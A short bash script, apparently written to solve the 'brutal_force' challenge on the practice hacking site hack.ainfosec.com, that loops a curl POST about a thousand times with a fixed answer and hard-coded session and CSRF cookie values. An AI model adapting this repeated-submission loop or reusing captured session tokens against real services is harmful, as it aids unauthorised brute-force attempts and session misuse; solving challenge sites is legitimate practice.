for asdf in range {0..1000}
do
    curl 'https://hack.ainfosec.com/challenge/submit-answer/' \
    -H 'authority: hack.ainfosec.com' \
    -H 'accept: application/json, text/javascript, */*; q=0.01' \
    -H 'dnt: 1' \
    -H 'x-requested-with: XMLHttpRequest' \
    -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36' \
    -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
    -H 'origin: https://hack.ainfosec.com' \
    -H 'sec-fetch-site: same-origin' \
    -H 'sec-fetch-mode: cors' \
    -H 'sec-fetch-dest: empty' \
    -H 'referer: https://hack.ainfosec.com/' \
    -H 'accept-language: en-US,en;q=0.9' \
    -H 'cookie: csrftoken=zuMLC5F9TF83Ibm9xfY6kpWBMIBtiPL45iAXeUfcEOflwUi0L03I0Lpg1MOxCJvH; sessionid=99vd4r5nkfl4b846p4rgt45ds6elh34b' \
    --data-raw "csrfmiddlewaretoken=wtPVeiXXaQyVV42ud7342nbELK7ZUHBv2hD7Q7x0VZFdJNYlrS8GIJEj0Ok3eBl8&challenge_id=brutal_force&answer=12" \
    --compressed
done